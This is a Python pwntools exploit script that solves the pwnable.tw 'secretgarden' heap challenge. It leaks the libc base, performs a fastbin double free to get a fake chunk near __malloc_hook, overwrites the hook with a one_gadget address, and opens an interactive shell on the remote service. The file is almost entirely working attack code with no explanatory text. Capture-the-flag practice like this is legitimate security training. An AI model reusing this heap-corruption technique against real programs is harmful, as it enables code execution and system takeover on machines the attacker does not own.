#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./secretgarden"
libcPath = "./libc_64.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10203

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process(elfPath)
    libc = elf.libc
    mainArena = 0x399b00
    #  oneGadget = 0x3f2d6
    oneGadget = 0x3f32a

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

    mainArena = 0x3c3b20
    #  oneGadget = 0x45216
    #  oneGadget = 0x4526a
    oneGadget = 0xef6c4

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Raise(length, name):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", "color")

def Visit():
    io.sendlineafter(" : ", "2")

def Remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    Raise(0xc0, '0' * 0xc0)
    Raise(0x60, '1' * 0x60)
    Raise(0x60, '2' * 0x60)
    #  DEBUG([0xE74], True)
    Remove(0)
    #  DEBUG([0xCD3], True)
    Raise(0x90, '3' * 0x8)
    Visit()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - mainArena
    success("libc.address", libc.address)
    pause()

    Remove(1) # 1
    Remove(2) # 2 -> 1
    DEBUG([0xE74], True)
    Remove(1) # 1 -> 2 -> 1

    #  DEBUG([0xCD3], True)
    Raise(0x60, p64(libc.sym['__malloc_hook'] - 0x28 + 5)) # 2 -> 1 -> fakeChunk
    Raise(0x60, 'a' * 0x60) # 1 -> fakeChunk
    Raise(0x60, 'b' * 0x60) # fakeChunk
    #  DEBUG([0xDA1], True)
    Raise(0x60, '\0' * 19 + p64(libc.address + oneGadget))

    #  DEBUG([0xE74], True)
    #  io.sendlineafer(" : ", "1")
    Remove(0)
    #  DEBUG([0xE74], True)
    Remove(0)
    
    io.interactive()
    io.close()
